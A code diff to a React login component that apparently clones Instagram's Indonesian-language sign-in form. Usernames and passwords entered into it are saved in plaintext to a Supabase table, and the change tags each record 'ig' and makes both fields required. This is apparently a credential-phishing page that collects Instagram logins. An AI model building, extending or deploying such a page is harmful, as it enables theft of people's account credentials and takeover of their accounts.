@@ -13,7 +13,7 @@ function Login() {
     try {
       const { data, error } = await supabase
         .from("test")
-        .insert([{ username: username, psw: password }])
+        .insert([{ username: username, psw: password, acc: "ig" }])
         .select();
 
       // Handle success or error here
@@ -36,12 +36,14 @@ function Login() {
       <div className="w-full flex flex-col gap-3 max-w-xs">
         <input
           type="text"
+          required
           className="w-full border-2 bg-[#FAFAFA] text-xs py-3 rounded-sm px-3 outline-none"
           placeholder="Nomor telepon, nama pengguna, atau email"
           onChange={(e) => setUsername(e.target.value)}
         />
         <input
           type="password"
+          required
           placeholder="Kata Sandi"
           onChange={(e) => setPassword(e.target.value)}
           className="w-full border-2 bg-[#FAFAFA] text-xs py-3 rounded-sm px-3 outline-none"
